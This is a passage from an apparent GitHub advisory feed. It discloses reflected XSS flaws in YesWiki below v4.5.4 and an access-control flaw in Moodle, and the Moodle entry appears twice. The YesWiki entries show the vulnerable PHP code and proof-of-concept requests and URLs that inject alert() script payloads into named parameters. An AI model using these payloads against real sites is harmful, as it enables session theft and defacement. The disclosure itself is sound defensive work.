<p>The vulnerability is located in the <a href="https://github.com/YesWiki/yeswiki/blob/6894234bbde6ab168bf4253f9a581bd24bf53766/tools/attach/libs/attach.lib.php#L724-L735">file</a></p>
<pre><code>        public function showUploadForm()
        {
            $this-&gt;file = $_GET['file'];
            echo '&lt;h3&gt;' . _t('ATTACH_UPLOAD_FORM_FOR_FILE') . ' ' . $this-&gt;file . "&lt;/h3&gt;\n";
            echo '&lt;form enctype="multipart/form-data" name="frmUpload" method="POST" action="' . $this-&gt;wiki-&gt;href('upload', $this-&gt;wiki-&gt;GetPageTag()) . "\"&gt;\n"
                . '	&lt;input type="hidden" name="wiki" value="' . $this-&gt;wiki-&gt;GetPageTag() . "/upload\" /&gt;\n"
                . '	&lt;input type="hidden" name="MAX_FILE_SIZE" value="' . $this-&gt;attachConfig['max_file_size'] . "\" /&gt;\n"
                . "	&lt;input type=\"hidden\" name=\"file\" value=\"$this-&gt;file\" /&gt;\n"
                . "	&lt;input type=\"file\" name=\"upFile\" size=\"50\" /&gt;&lt;br /&gt;\n"
                . '	&lt;input class="btn btn-primary" type="submit" value="' . _t('ATTACH_SAVE') . "\" /&gt;\n"
                . "&lt;/form&gt;\n";
        }
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>You need to send a request to endpoint and abusing the <code>file</code> parameter, we can successfully obtain client side javascript execution</li>
</ol>
<pre><code>GET /?PagePrincipale/upload&amp;file=%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: localhost:8085
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
</code></pre>
<ol start="2">
<li>Get a response<img src="https://github.com/user-attachments/assets/b923f563-ead5-494c-8fbd-1c3b11635820" alt="Снимок экрана 2025-04-11 в 02 04 55" width="853"></li>
</ol>
<h3 id="impact">Impact</h3>
<p>This vulnerability allows any malicious unauthenticated user to create a link that can be clicked on in the victim context to perform arbitrary actions</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-2f8p-qqx2-gwr2">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-2f8p-qqx2-gwr2</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/commit/0dac9e2fb2a5e69f13a3c9f761ecae6ed9676206">https://github.com/YesWiki/yeswiki/commit/0dac9e2fb2a5e69f13a3c9f761ecae6ed9676206</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/blob/6894234bbde6ab168bf4253f9a581bd24bf53766/tools/attach/libs/attach.lib.php#L724-L735">https://github.com/YesWiki/yeswiki/blob/6894234bbde6ab168bf4253f9a581bd24bf53766/tools/attach/libs/attach.lib.php#L724-L735</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46349">https://nvd.nist.gov/vuln/detail/CVE-2025-46349</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/pull/1264/commits/6edde40eb7eeb5d60619ac4d1e0a0422d92e9524">https://github.com/YesWiki/yeswiki/pull/1264/commits/6edde40eb7eeb5d60619ac4d1e0a0422d92e9524</a></li>
<li><a href="https://github.com/advisories/GHSA-2f8p-qqx2-gwr2">https://github.com/advisories/GHSA-2f8p-qqx2-gwr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2f8p-qqx2-gwr2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-04-29T14:38:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yeswiki/yeswiki] Yeswiki Vulnerable to Authenticated Reflected Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-cg4f-cq8h-3ch8</id>
        <link href="https://github.com/advisories/GHSA-cg4f-cq8h-3ch8"/>
        <updated>2025-04-29T20:27:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><strong>Vulnerable Version:</strong> Yeswiki &lt; v4.5.4
**Vulnerable Endpoint:** <code>/?PagePrincipale%2Fdeletepage</code>
**Vulnerable Parameter:** <code>incomingurl</code>
**Payload:** <code>"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="details">Details</h3>
<p>Reflected Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p>
<h3 id="poc">PoC</h3>
<p><strong>NOTE:</strong> This vulnerability requires admin access.</p>
<ol>
<li><p>Visit the endpoint as mentioned below and see that an alert box pops up:</p>
<p><strong>URL with Payload:</strong> <code>https://yeswiki.net/?PagePrincipale%2Fdeletepage&amp;incomingurl="&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
</li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker can use a reflected cross-site scripting attack to steal cookies from an authenticated user by having them click on a malicious link. Stolen cookies allow the attacker to take over the user’s session. This vulnerability may also allow attackers to deface the website or embed malicious content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-cg4f-cq8h-3ch8">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-cg4f-cq8h-3ch8</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/commit/e2603176a4607b83659635a0c517550d4a171cb9">https://github.com/YesWiki/yeswiki/commit/e2603176a4607b83659635a0c517550d4a171cb9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46350">https://nvd.nist.gov/vuln/detail/CVE-2025-46350</a></li>
<li><a href="https://github.com/advisories/GHSA-cg4f-cq8h-3ch8">https://github.com/advisories/GHSA-cg4f-cq8h-3ch8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cg4f-cq8h-3ch8</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-29T14:37:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yeswiki/yeswiki] Yeswiki Vulnerable to Unauthenticated Reflected Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-ggqx-43h2-55jp</id>
        <link href="https://github.com/advisories/GHSA-ggqx-43h2-55jp"/>
        <updated>2025-04-30T17:26:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><strong>Vulnerable Version:</strong> Yeswiki &lt; v4.5.4
**Category:** Injection
**CWE: 79:** Improper Neutralization of Input During Web Page Generation (CWE-79)
**CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
**Vulnerable Endpoint:** <code>/?BazaR</code>
**Vulnerable Parameter:** <code>idformulaire</code>
**Payload:** <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="details">Details</h3>
<p>Reflected Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Visit the endpoint as mentioned below and see that an alert box pops up:
<strong>URL with Payload:</strong> <code>https://yeswiki.net/?BazaR&amp;vue=formulaire&amp;action=confirm_delete&amp;idformulaire=%3cscript%3ealert(1)%3c%2fscript%3e</code></li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker can use a reflected cross-site scripting attack to steal cookies from an authenticated user by having them click on a malicious link. Stolen cookies allow the attacker to take over the user’s session. This vulnerability may also allow attackers to deface the website or embed malicious content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-ggqx-43h2-55jp">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-ggqx-43h2-55jp</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/commit/4e9e51d80cd024ed2ac5c12c820817e6d8c2655a">https://github.com/YesWiki/yeswiki/commit/4e9e51d80cd024ed2ac5c12c820817e6d8c2655a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46550">https://nvd.nist.gov/vuln/detail/CVE-2025-46550</a></li>
<li><a href="https://github.com/advisories/GHSA-ggqx-43h2-55jp">https://github.com/advisories/GHSA-ggqx-43h2-55jp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ggqx-43h2-55jp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-29T14:36:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yeswiki/yeswiki] Yeswiki Vulnerable to Unauthenticated Reflected Cross-site Scripting]]></title>
        <id>https://github.com/advisories/GHSA-r9gv-qffm-xw6f</id>
        <link href="https://github.com/advisories/GHSA-r9gv-qffm-xw6f"/>
        <updated>2025-04-30T17:26:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><strong>Vulnerable Version:</strong> Yeswiki  &lt; v4.5.4
**Category:** Injection
**CWE: 79:** Improper Neutralization of Input During Web Page Generation (CWE-79)
**CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)
**Vulnerable Endpoint:** <code>/?BazaR/bazariframe</code>
**Vulnerable Parameter:** <code>template</code>
**Payload:** <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<h3 id="details">Details</h3>
<p>Reflected Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser-side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Visit the endpoint as mentioned below and see that an alert box pops up:
<strong>URL with Payload:</strong> <code>https://yeswiki.net/?BazaR/bazariframe&amp;id=2&amp;template=%3cscript%3ealert(1)%3c%2fscript%3e</code></li>
</ol>
<h3 id="impact">Impact</h3>
<p>An attacker can use a reflected cross-site scripting attack to steal cookies from an authenticated user by having them click on a malicious link. Stolen cookies allow the attacker to take over the user’s session. This vulnerability may also allow attackers to deface the website or embed malicious content.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/YesWiki/yeswiki/security/advisories/GHSA-r9gv-qffm-xw6f">https://github.com/YesWiki/yeswiki/security/advisories/GHSA-r9gv-qffm-xw6f</a></li>
<li><a href="https://github.com/YesWiki/yeswiki/commit/107d43056adebaa0c731230f9fd010898e88f3f5">https://github.com/YesWiki/yeswiki/commit/107d43056adebaa0c731230f9fd010898e88f3f5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46549">https://nvd.nist.gov/vuln/detail/CVE-2025-46549</a></li>
<li><a href="https://github.com/advisories/GHSA-r9gv-qffm-xw6f">https://github.com/advisories/GHSA-r9gv-qffm-xw6f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9gv-qffm-xw6f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-29T14:35:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moodle/moodle] Moodle allows IDOR when accessing the cohorts report]]></title>
        <id>https://github.com/advisories/GHSA-34g7-pg9j-pxgp</id>
        <link href="https://github.com/advisories/GHSA-34g7-pg9j-pxgp"/>
        <updated>2025-04-25T17:28:42.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was discovered in Moodle. Additional checks were required to ensure that users can only access cohort data they are authorized to retrieve.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3647">https://nvd.nist.gov/vuln/detail/CVE-2025-3647</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-3647">https://access.redhat.com/security/cve/CVE-2025-3647</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2359762">https://bugzilla.redhat.com/show_bug.cgi?id=2359762</a></li>
<li><a href="https://moodle.org/mod/forum/discuss.php?d=467607">https://moodle.org/mod/forum/discuss.php?d=467607</a></li>
<li><a href="https://github.com/moodle/moodle/commit/bd6ec0ac84cf0f73ab35e7e244e1f9b06929083a">https://github.com/moodle/moodle/commit/bd6ec0ac84cf0f73ab35e7e244e1f9b06929083a</a></li>
<li><a href="https://github.com/advisories/GHSA-34g7-pg9j-pxgp">https://github.com/advisories/GHSA-34g7-pg9j-pxgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-34g7-pg9j-pxgp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-25T15:31:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[moodle/moodle] Moodle allows IDOR when accessing the cohorts report]]></title>
        <id>https://github.com/advisories/GHSA-34g7-pg9j-pxgp</id>
        <link href="https://github.com/advisories/GHSA-34g7-pg9j-pxgp"/>
        <updated>2025-04-25T17:28:42.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was discovered in Moodle. Additional checks were required to ensure that users can only access cohort data they are authorized to retrieve.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-3647">https://nvd.nist.gov/vuln/detail/CVE-2025-3647</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-3647">https://access.redhat.com/security/cve/CVE-2025-3647</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2359762">https://bugzilla.redhat.com/show_bug.cgi?id=2359762</a></li>
<li><a href="https://moodle.org/mod/forum/discuss.php?d=467607">https://moodle.org/mod/forum/discuss.php?d=467607</a></li>
<li><a href="https://github.com/moodle/moodle/commit/bd6ec0ac84cf0f73ab35e7e244e1f9b06929083a">https://github.com/moodle/moodle/commit/bd6ec0ac84cf0f73ab35e7e244e1f9b06929083a</a></li>
<li><a href="https://github.com/advisories/GHSA-34g7-pg9j-pxgp">https://github.com/advisories/GHSA-34g7-pg9j-pxgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-34g7-pg9j-pxgp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-25T15:31:24.000Z</published>
    </entry>
</feed>